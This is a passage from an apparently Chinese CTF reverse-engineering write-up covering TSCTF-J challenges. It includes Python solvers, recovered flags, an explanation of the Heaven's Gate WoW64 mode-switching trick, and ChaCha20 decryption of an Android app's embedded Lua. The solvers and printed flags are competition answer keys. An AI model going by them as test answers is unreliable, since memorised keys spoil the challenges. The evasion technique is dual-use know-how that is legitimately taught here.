class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">array3 = [</span><br><span class="line">    <span class="number">871</span>, <span class="number">1654</span>, <span class="number">789</span>, <span class="number">1617</span>, <span class="number">1221</span>, <span class="number">2173</span>, <span class="number">871</span>, <span class="number">1724</span>, <span class="number">629</span>, <span class="number">1111</span>,</span><br><span class="line">    <span class="number">789</span>, <span class="number">1664</span>, <span class="number">783</span>, <span class="number">1579</span>, <span class="number">989</span>, <span class="number">1633</span>, <span class="number">1229</span>, <span class="number">2148</span>, <span class="number">891</span>, <span class="number">1703</span>,</span><br><span class="line">    <span class="number">1237</span>, <span class="number">2249</span>, <span class="number">1229</span>, <span class="number">2161</span>, <span class="number">1157</span>, <span class="number">2095</span>, <span class="number">1237</span>, <span class="number">2201</span>, <span class="number">1243</span>, <span class="number">2166</span>,</span><br><span class="line">    <span class="number">789</span>, <span class="number">1604</span>, <span class="number">941</span>, <span class="number">1669</span>, <span class="number">813</span>, <span class="number">1651</span>, <span class="number">845</span>, <span class="number">1633</span>, <span class="number">807</span>, <span class="number">1645</span>,</span><br><span class="line">    <span class="number">941</span>, <span class="number">1673</span>, <span class="number">971</span>, <span class="number">1863</span>, <span class="number">941</span>, <span class="number">1648</span>, <span class="number">789</span>, <span class="number">1620</span>, <span class="number">941</span>, <span class="number">1659</span>,</span><br><span class="line">    <span class="number">1255</span>, <span class="number">2157</span>, <span class="number">1167</span>, <span class="number">2121</span>, <span class="number">941</span>, <span class="number">1647</span>, <span class="number">807</span>, <span class="number">1662</span>, <span class="number">845</span>, <span class="number">1634</span>,</span><br><span class="line">    <span class="number">1243</span>, <span class="number">2165</span>, <span class="number">813</span>, <span class="number">1650</span>, <span class="number">941</span>, <span class="number">1676</span>, <span class="number">813</span>, <span class="number">1697</span>, <span class="number">783</span>, <span class="number">1589</span>,</span><br><span class="line">    <span class="number">941</span>, <span class="number">1654</span>, <span class="number">1167</span>, <span class="number">2097</span>, <span class="number">1255</span>, <span class="number">2157</span>, <span class="number">941</span>, <span class="number">1673</span>, <span class="number">789</span>, <span class="number">1597</span>,</span><br><span class="line">    <span class="number">941</span>, <span class="number">1655</span>, <span class="number">941</span>, <span class="number">1653</span>, <span class="number">813</span>, <span class="number">1673</span>, <span class="number">789</span>, <span class="number">1598</span>, <span class="number">891</span>, <span class="number">1735</span>,</span><br><span class="line">    <span class="number">941</span>, <span class="number">1600</span>, <span class="number">629</span>, <span class="number">1076</span>, <span class="number">891</span>, <span class="number">1728</span>, <span class="number">603</span>, <span class="number">1008</span>, <span class="number">389</span>, <span class="number">827</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag_bytes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>, <span class="number">2</span>):</span><br><span class="line">    newA, newB = array3[i], array3[i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        num2 = ((a &lt;&lt; <span class="number">3</span>) &amp; <span class="number">0xFFFFFFFF</span>) ^ <span class="number">83</span></span><br><span class="line">        newA_calc = ((num2 + a) ^ (a + <span class="number">72</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">if</span> newA_calc != newA:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        val = (newB - newA) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        b = num2 ^ val</span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= b &lt; <span class="number">256</span>:</span><br><span class="line">            flag_bytes.extend([a, b])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">bytes</span>(flag_bytes).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>TSCTF-J{3f619a0b_Would_you_say_that_someone_who_had_every_intention_to_be_brave_was_a_coward?_81dd64f3}</p><h3 id="天堂之门"><a href="#天堂之门" class="headerlink" title="天堂之门"></a>天堂之门</h3><p>可以直接看，之前做DubheCTF的时候做到过类似的题，这题算是弱化版吧</p><p><a href="https://clovershrub.github.io/2024/03/19/DubheCTF-Destination&Moon/index.html">DubheCTF-Destination&amp;Moon | Clovershrub</a></p><p>这个Dubhe和SUS都出过类似的题刚好做过</p><p>也可以看我的<a href="https://matriy330.github.io/de9c80c5/?highlight=%E5%A4%A9%E5%A0%82">DubheCTF 2024 re 复现 | Matriy’s blog</a></p><p>天堂之门技术简述：</p><blockquote><p>在<strong>x64</strong>下的进程，不管是32位或者是64位，实际上都映射了两个地址空间，一个是32位，一个是64位，相当于一个进程的两种工作模式。</p><p>解释：在64位的操作系统上，32位的应用程序并不能直接在64位环境下运行。为了使32位程序可以正常运行，操作系统提供了一个称为<strong>WoW64</strong>（Windows on Windows 64-bit）的子系统。WoW64 子系统相当于一个兼容层，专门为32位程序提供了类似32位的运行环境。</p><p>他们之间的关键区别在于<code>cs</code>段寄存器。</p><p>64位:CS &#x3D; 0x33 32位:CS &#x3D; 0x23</p><p>Windows判别位的方式，是根据<code>cs</code>段寄存器的，所以只要修改<code>cs</code>的值，就能实现切换，再使用<code>retf</code>指令回到xx位。</p></blockquote><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013132901694.png" alt="image-20251013132901694"></p><p>0x401720 的 main 中，通过 get_image_base() 拿到模块基址，接着在 0x40180C 初始化 rc4_state，for循环里执行 memcpy(&amp;rc4_state[64 * i], Src, 0x40u)，做 4 次。因为 Src 就是 PE 镜像开头（DOS 头），每次拷贝 0x40 字节，四次拼起来正好 256 字节，这就是 RC4 状态数组的来源。</p><p>get_image_base里的三次 memcpy 把 NtCurrentPeb()-&gt;Ldr 结构一路走链表：先取 PEB-&gt;Ldr，再取 Ldr-&gt;InMemoryOrderModuleList.Flink。这是标准的 PEB 遍历流程，返回的就是当前模块的装载基址，也就是 DOS&#x2F;PE 头所在的地址。</p><blockquote><p>做的时候没有调试，上面这个猜也能猜到，虽然我是静态出的</p></blockquote><p>如果调试也行：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013143506165.png" alt="image-20251013143506165"></p><p>此时 EAX 就是 Src 的值，也就是当前模块的装载基址。右键 EAX → Follow in Dump，Dump 窗口会直接显示该地址的内存内容；可以看到开头是 4D 5A … 的 DOS 头</p><p>main读取 40 字符输入，复制 PE 头首 0x40 字节 4 次到 256 字节状态，调用 rc4_transform 做 RC4 变换，再把结果与 0x405000 处的10 个 dword 比较</p><p>这里我提供两种分析方式</p><p><strong>静态分析</strong>：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013163703598.png" alt="image-20251013163703598"></p><p>这段所有的提取出来</p><p>有几种方式发现逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">stub_bytes = [</span><br><span class="line">    0x6A, 0x33, 0x68, 0x78, 0x56, 0x34, 0x12, 0xCB, 0x56, 0x57, 0x48, 0xBE,</span><br><span class="line">    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xBF, 0x00, 0x00,</span><br><span class="line">    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB9, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">    0x00, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC0, 0x45, 0x33, 0xC9, 0x41, 0xFE,</span><br><span class="line">    0xC0, 0x42, 0x0F, 0xB6, 0x04, 0x07, 0x41, 0x00, 0xC1, 0x42, 0x8A, 0x14,</span><br><span class="line">    0x0F, 0x42, 0x88, 0x14, 0x07, 0x42, 0x88, 0x04, 0x0F, 0x42, 0x0F, 0xB6,</span><br><span class="line">    0x04, 0x07, 0x42, 0x02, 0x04, 0x0F, 0x40, 0x0F, 0xB6, 0x04, 0x07, 0x30,</span><br><span class="line">    0x06, 0x48, 0xFF, 0xC6, 0xE2, 0xD4, 0x5F, 0x5E, 0x6A, 0x23, 0x68, 0x78,</span><br><span class="line">    0x56, 0x34, 0x12, 0x48, 0xCB, 0xC3</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ol><li><p>丢给chatgpt</p></li><li><p><a href="https://defuse.ca/online-x86-assembler.htm#disassembly2">Online x86 and x64 Intel Instruction Assembler</a></p><p>手搓</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013164527419.png" alt="image-20251013164527419"></p></li><li><p>patch到一个新文件</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013164612347.png" alt="image-20251013164612347"></p></li><li><p>patch到IDA打开的文件的某个可用地址</p><p><img src="C:\Users\soul\AppData\Roaming\Typora\typora-user-images\image-20251013165126021.png" alt="image-20251013165126021"></p></li></ol><p>动态分析</p><p>动调然后对</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013165208241.png" alt="image-20251013165208241"></p><p>下断点分析</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011154341441.png" alt="image-20251011154341441"></p><p>heavens_gate_thread 与 wow64_gate_probe transition 只是维持门</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_keystream</span>(<span class="params">state: <span class="built_in">bytearray</span>, length: <span class="built_in">int</span></span>):</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        j = (j + state[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">        state[i], state[j] = state[j], state[i]</span><br><span class="line">        <span class="keyword">yield</span> state[(state[i] + state[j]) &amp; <span class="number">0xFF</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    pe = Path(<span class="string">&quot;heaven.exe&quot;</span>).read_bytes()</span><br><span class="line">    state = <span class="built_in">bytearray</span>(pe[:<span class="number">0x40</span>] * <span class="number">4</span>)</span><br><span class="line">    <span class="built_in">print</span>(state)</span><br><span class="line"></span><br><span class="line">    cipher = <span class="built_in">bytes</span>([</span><br><span class="line">        <span class="number">0x0E</span>, <span class="number">0xEB</span>, <span class="number">0xFB</span>, <span class="number">0xC4</span>, <span class="number">0xD6</span>, <span class="number">0x60</span>, <span class="number">0x07</span>, <span class="number">0x7B</span>, <span class="number">0x57</span>, <span class="number">0x25</span>,</span><br><span class="line">        <span class="number">0x79</span>, <span class="number">0x74</span>, <span class="number">0x5F</span>, <span class="number">0x34</span>, <span class="number">0x12</span>, <span class="number">0x57</span>, <span class="number">0x30</span>, <span class="number">0x23</span>, <span class="number">0x29</span>, <span class="number">0x7E</span>,</span><br><span class="line">        <span class="number">0x3F</span>, <span class="number">0x2B</span>, <span class="number">0x38</span>, <span class="number">0x7C</span>, <span class="number">0x12</span>, <span class="number">0x2A</span>, <span class="number">0x79</span>, <span class="number">0x39</span>, <span class="number">0x08</span>, <span class="number">0x12</span>,</span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x75</span>, <span class="number">0x7F</span>, <span class="number">0x7B</span>, <span class="number">0x7E</span>, <span class="number">0x2B</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x2C</span>, <span class="number">0x30</span>,</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    flag_bytes = <span class="built_in">bytes</span>(c ^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(cipher, rc4_keystream(state, <span class="built_in">len</span>(cipher))))</span><br><span class="line">    <span class="built_in">print</span>(flag_bytes.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>TSCTF-J{Wh4t_4_W0nd3rfu1_g4tE_$8263fbea}</p><h3 id="GrilHook"><a href="#GrilHook" class="headerlink" title="GrilHook"></a>GrilHook</h3><blockquote><p>我是静态出的，但是出题人可能希望考察hook，或者加了反调，识别特征啥的，后面有时间再补</p><p>支持一下插件：<a href="https://github.com/Lynnette177/GirlHook"><a href="https://github.com/Lynnette177/GirlHook">Lynnette177&#x2F;GirlHook: GirlHook is a Lua-scriptable ART hook framework designed for dynamic method interception and gadget-level instrumentation on Android. G.I.R.L. stands for Gadget-Injection Runtime for Lua, highlighting its modular native core and script-driven flexibility. GirlHook是一个轻量化的运行LUA脚本的Android Hook框架</a></a></p><p>点点star 0.0</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lynnette.girlhook;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> kotlin.text.Typography;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;girlhook&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        <span class="keyword">if</span> (getSupportActionBar() != <span class="literal">null</span>) &#123;</span><br><span class="line">            getSupportActionBar().hide();</span><br><span class="line">        &#125;</span><br><span class="line">        setContentView(C0860R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">check_if_correct</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] cArr = &#123;<span class="number">171</span>, <span class="number">205</span>&#125;;</span><br><span class="line">        <span class="comment">//  [255, 158, 232, 153, 237, 224, 225, 182, 195, 162, 220, 146, 223, 162, 244, 165, 196, 162, 192, 146, 194, 163, 244, 140, 249, 153, 148, 176]</span></span><br><span class="line">        <span class="type">char</span>[] cArr2 = &#123;<span class="number">255</span>, <span class="number">158</span>, <span class="number">232</span>, <span class="number">153</span>, <span class="number">237</span>, <span class="number">224</span>, <span class="number">225</span>, Typography.paragraph, <span class="number">195</span>, Typography.cent, <span class="number">220</span>, <span class="number">146</span>, <span class="number">223</span>, Typography.cent, <span class="number">244</span>, <span class="number">165</span>, <span class="number">196</span>, Typography.cent, <span class="number">192</span>, <span class="number">146</span>, <span class="number">194</span>, Typography.pound, <span class="number">244</span>, <span class="number">140</span>, <span class="number">249</span>, <span class="number">153</span>, <span class="number">148</span>, Typography.degree&#125;;</span><br><span class="line">        <span class="keyword">if</span> (str.length() != <span class="number">28</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (((<span class="type">char</span>) (str.charAt(i) ^ cArr[i % <span class="number">2</span>])) != cArr2[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">check_again</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> str.equals(<span class="string">&quot;AmQTDHd7fy5CIAQyRUokVD1RJ3VlJFM4WTE+CBcn&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onVerifyClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">obj</span> <span class="operator">=</span> ((EditText) findViewById(C0860R.C0863id.input_text)).getText().toString();</span><br><span class="line">        <span class="keyword">if</span> (!check_if_correct(obj) ? check_again(obj) : <span class="literal">true</span>) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;正确!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;错误&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是jadx打开后，非常简单，题目是hook这个肯定不对，直接看so层</p><p>打开就能看到waht_is,一看就非常眼熟,chacha20</p><blockquote><p>怎么看出来的?可以看我的<a href="https://matriy330.github.io/32958ffb/">CTF逆向常见加密算法总结 | Matriy’s blog</a>函数开头把四个字常量依次写进状态数组：0x61707865、0x3320646E、0x79622D32、0x6B206574</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013170901380.png" alt="image-20251013170901380"></p></blockquote><p>initial_global里调用了这个方法，去动态的hook修改方法功能</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011155602338.png" alt="image-20251011155602338"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011155708244.png" alt="image-20251011155708244"></p><p>本来想hook的，看到chacha20感觉不太复杂看看能不能直接出</p><p>找到secret</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251011155956801.png" alt="image-20251011155956801"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">SO_PATH = Path(<span class="string">&quot;libgirlhook.so&quot;</span>)</span><br><span class="line">SECRET_FILE_OFFSET = <span class="number">0x18CC40</span></span><br><span class="line">SECRET_SIZE = <span class="number">1436</span></span><br><span class="line">KEY = <span class="string">b&quot;youareclosetoit_youareclosetoit_&quot;</span></span><br><span class="line">NONCE = <span class="string">b&quot;continueabcd&quot;</span></span><br><span class="line">INITIAL_COUNTER = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotl32</span>(<span class="params">value: <span class="built_in">int</span>, shift: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    value &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> ((value &lt;&lt; shift) &amp; <span class="number">0xFFFFFFFF</span>) | (value &gt;&gt; (<span class="number">32</span> - shift))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quarter_round</span>(<span class="params">state, a, b, c, d</span>):</span><br><span class="line">    state[a] = (state[a] + state[b]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    state[d] ^= state[a]</span><br><span class="line">    state[d] = rotl32(state[d], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    state[c] = (state[c] + state[d]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    state[b] ^= state[c]</span><br><span class="line">    state[b] = rotl32(state[b], <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">    state[a] = (state[a] + state[b]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    state[d] ^= state[a]</span><br><span class="line">    state[d] = rotl32(state[d], <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    state[c] = (state[c] + state[d]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    state[b] ^= state[c]</span><br><span class="line">    state[b] = rotl32(state[b], <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chacha20_block</span>(<span class="params">key_words, counter, nonce_words</span>):</span><br><span class="line">    state = [</span><br><span class="line">        <span class="number">0x61707865</span>, <span class="number">0x3320646E</span>, <span class="number">0x79622D32</span>, <span class="number">0x6B206574</span>,</span><br><span class="line">        *key_words,</span><br><span class="line">        counter,</span><br><span class="line">        *nonce_words</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    working = state.copy()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        quarter_round(working, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>)</span><br><span class="line">        quarter_round(working, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">13</span>)</span><br><span class="line">        quarter_round(working, <span class="number">2</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">14</span>)</span><br><span class="line">        quarter_round(working, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">        quarter_round(working, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">15</span>)</span><br><span class="line">        quarter_round(working, <span class="number">1</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">12</span>)</span><br><span class="line">        quarter_round(working, <span class="number">2</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">13</span>)</span><br><span class="line">        quarter_round(working, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span>.join(</span><br><span class="line">        struct.pack(<span class="string">&quot;&lt;I&quot;</span>, (working[i] + state[i]) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chacha20_decrypt</span>(<span class="params">ciphertext: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span>, nonce: <span class="built_in">bytes</span>, counter: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    key_words = struct.unpack(<span class="string">&quot;&lt;8I&quot;</span>, key)</span><br><span class="line">    nonce_words = struct.unpack(<span class="string">&quot;&lt;3I&quot;</span>, nonce)</span><br><span class="line"></span><br><span class="line">    plaintext = <span class="built_in">bytearray</span>()</span><br><span class="line">    block_counter = counter</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), <span class="number">64</span>):</span><br><span class="line">        keystream_block = chacha20_block(key_words, block_counter, nonce_words)</span><br><span class="line">        block_counter = (block_counter + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        chunk = ciphertext[offset:offset + <span class="number">64</span>]</span><br><span class="line">        plaintext.extend(c ^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(chunk, keystream_block))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plaintext)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    so_bytes = SO_PATH.read_bytes()</span><br><span class="line">    secret = so_bytes[SECRET_FILE_OFFSET:SECRET_FILE_OFFSET + SECRET_SIZE]</span><br><span class="line"></span><br><span class="line">    lua_plain = chacha20_decrypt(secret, KEY, NONCE, INITIAL_COUNTER)</span><br><span class="line">    Path(<span class="string">&quot;decrypted_lua.lua&quot;</span>).write_bytes(lua_plain)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;完成：decrypted_lua.lua (<span class="subst">&#123;<span class="built_in">len</span>(lua_plain)&#125;</span> 